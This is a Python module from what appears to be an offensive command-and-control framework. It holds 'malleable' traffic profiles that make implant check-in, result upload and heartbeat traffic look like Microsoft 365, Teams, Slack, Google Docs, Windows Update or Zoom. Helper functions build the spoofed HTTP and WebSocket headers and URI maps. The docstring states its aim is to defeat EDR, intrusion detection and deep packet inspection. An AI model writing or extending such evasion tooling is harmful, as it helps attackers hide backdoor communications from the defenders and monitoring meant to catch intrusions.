"""Malleable C2 traffic profiles — disguise C2 comms as legitimate services.

Each profile defines:
  - HTTP headers (User-Agent, Host, etc.)
  - URI paths for register/checkin/results/heartbeat
  - Content-Type and response wrapping
  - WS upgrade headers

Defeats: network-based EDR (Falcon, Elastic), IDS/IPS, NDR appliances,
         deep packet inspection, traffic analysis
"""

PROFILES = {
    'microsoft365': {
        'name': 'Microsoft 365 / OneDrive',
        'user_agent': 'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17328; Pro)',
        'host_header': 'outlook.office365.com',
        'headers': {
            'Accept': 'application/json',
            'Accept-Language': 'en-US',
            'X-ClientAppVersion': '16.0.17328.20162',
            'X-RequestType': 'SyncMail',
            'X-OWA-CANARY': '',
            'MS-ASProtocolVersion': '16.0',
        },
        'register_uri': '/api/v2.0/me/mailfolders/inbox/messages',
        'checkin_uri': '/api/v2.0/me/mailfolders/inbox/delta',
        'results_uri': '/api/v2.0/me/sendmail',
        'heartbeat_uri': '/api/v2.0/me',
        'content_type': 'application/json; charset=utf-8',
        'ws_origin': 'https://outlook.office365.com',
        'ws_headers': {
            'Sec-WebSocket-Protocol': 'graphql-transport-ws',
            'Origin': 'https://outlook.office365.com',
        },
    },
    'teams': {
        'name': 'Microsoft Teams',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/24004.1408.2681.4834 Chrome/120.0.6099.291 Electron/28.2.10 Safari/537.36',
        'host_header': 'teams.microsoft.com',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US',
            'X-Ms-Client-Type': 'desktop',
            'X-Ms-Client-Version': '49/24004.1408.2681.4834',
            'X-Ms-Scenario-Id': '',
            'Authorization': 'Bearer eyJ0eX...',
        },
        'register_uri': '/api/csa/api/v1/teams/users/me',
        'checkin_uri': '/api/csa/api/v1/teams/notifications/poll',
        'results_uri': '/api/csa/api/v1/teams/messages',
        'heartbeat_uri': '/api/csa/api/v1/teams/presence/heartbeat',
        'content_type': 'application/json',
        'ws_origin': 'https://teams.microsoft.com',
        'ws_headers': {
            'Sec-WebSocket-Protocol': 'trouter-client-v1',
            'Origin': 'https://teams.microsoft.com',
        },
    },
    'slack': {
        'name': 'Slack Desktop',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Slack/4.36.140 Chrome/120.0.6099.291 Electron/28.2.10 Safari/537.36',
        'host_header': 'edgeapi.slack.com',
        'headers': {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'X-Slack-Version-Ts': '1704067200',
        },
        'register_uri': '/api/auth.signin',
        'checkin_uri': '/api/conversations.history',
        'results_uri': '/api/chat.postMessage',
        'heartbeat_uri': '/api/users.getPresence',
        'content_type': 'application/json; charset=utf-8',
        'ws_origin': 'https://app.slack.com',
        'ws_headers': {
            'Origin': 'https://app.slack.com',
        },
    },
    'google_docs': {
        'name': 'Google Docs / Drive',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'host_header': 'docs.google.com',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'X-Client-Data': '',
        },
        'register_uri': '/document/d/e/2PACX-1vR/edit',
        'checkin_uri': '/document/d/e/2PACX-1vR/export?format=txt',
        'results_uri': '/upload/drive/v3/files',
        'heartbeat_uri': '/drive/v3/about?fields=user',
        'content_type': 'application/x-www-form-urlencoded',
        'ws_origin': 'https://docs.google.com',
        'ws_headers': {
            'Origin': 'https://docs.google.com',
        },
    },
    'windows_update': {
        'name': 'Windows Update',
        'user_agent': 'Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.50',
        'host_header': 'fe3cr.delivery.mp.microsoft.com',
        'headers': {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'MS-CV': '',
        },
        'register_uri': '/clientwebservice/client.asmx',
        'checkin_uri': '/filestreamingservice/files/download',
        'results_uri': '/clientwebservice/client.asmx/GetExtendedUpdateInfo2',
        'heartbeat_uri': '/clientwebservice/client.asmx/Ping',
        'content_type': 'application/soap+xml; charset=utf-8',
        'ws_origin': None,
        'ws_headers': {},
    },
    'zoom': {
        'name': 'Zoom Client',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ZoomClient/5.17.5 (KHTML, like Gecko) Chrome/120.0.6099.291 Safari/537.36',
        'host_header': 'us06web.zoom.us',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US',
            'X-Zm-Trackingid': '',
            'X-Zm-Client-Type': '1',
        },
        'register_uri': '/api/v2/users/me',
        'checkin_uri': '/api/v2/meetings/status',
        'results_uri': '/api/v2/chat/messages',
        'heartbeat_uri': '/api/v2/users/me/presence',
        'content_type': 'application/json',
        'ws_origin': 'https://us06web.zoom.us',
        'ws_headers': {
            'Origin': 'https://us06web.zoom.us',
            'Sec-WebSocket-Protocol': 'xmpp',
        },
    },
}


def get_profile(name='microsoft365'):
    """Get a C2 profile by name"""
    return PROFILES.get(name, PROFILES['microsoft365'])


def get_profile_names():
    """List available profile names"""
    return list(PROFILES.keys())


def generate_http_headers(profile_name='microsoft365'):
    """Generate Python dict literal for HTTP headers from a profile"""
    profile = get_profile(profile_name)
    headers = {
        'User-Agent': profile['user_agent'],
        'Accept': profile['headers'].get('Accept', '*/*'),
        'Accept-Language': profile['headers'].get('Accept-Language', 'en-US'),
        'Content-Type': profile['content_type'],
        'Connection': 'keep-alive',
    }
    for k, v in profile['headers'].items():
        if k not in headers and v:
            headers[k] = v
    return headers


def generate_ws_headers(profile_name='microsoft365'):
    """Generate WS connection headers from a profile"""
    profile = get_profile(profile_name)
    headers = {
        'User-Agent': profile['user_agent'],
        'Origin': profile.get('ws_origin') or f"https://{profile['host_header']}",
    }
    for k, v in profile.get('ws_headers', {}).items():
        if v:
            headers[k] = v
    return headers


def generate_uris(profile_name='microsoft365'):
    """Generate URI map from a profile"""
    profile = get_profile(profile_name)
    return {
        'register': profile['register_uri'],
        'checkin': profile['checkin_uri'],
        'results': profile['results_uri'],
        'heartbeat': profile['heartbeat_uri'],
    }
